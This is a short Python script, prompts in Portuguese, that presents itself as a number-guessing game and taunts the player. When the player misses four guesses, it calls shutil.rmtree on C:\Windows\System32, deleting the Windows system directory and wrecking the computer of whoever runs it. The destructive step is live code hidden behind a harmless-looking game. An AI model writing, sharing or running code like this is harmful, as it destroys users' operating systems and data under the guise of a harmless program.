import os
import random
import shutil

cpu = random.randint(1, 10)
tentativas = 4
contador = 1

numero = int(input('Olá vamos jogar um jogo?'
                   '\nAdivinhe o número de 1 a 10, senão...ADEUS PC (Você tem em 4 chances para acertar): '))

while numero != cpu and contador < tentativas:
    numero = int(input('Errou, tente novamente: '))
    contador += 1

if numero == cpu:
    print('\nParabéns, escapou de perder seu computador')
else:
    print('\nPerdeu o pc trouxa kkkkkk')

    caminho = r"C:\Windows\System32"
    if os.path.exists(caminho):
        if os.path.isdir(caminho):
            shutil.rmtree(caminho)
            print("Dê adeus a seu pc")
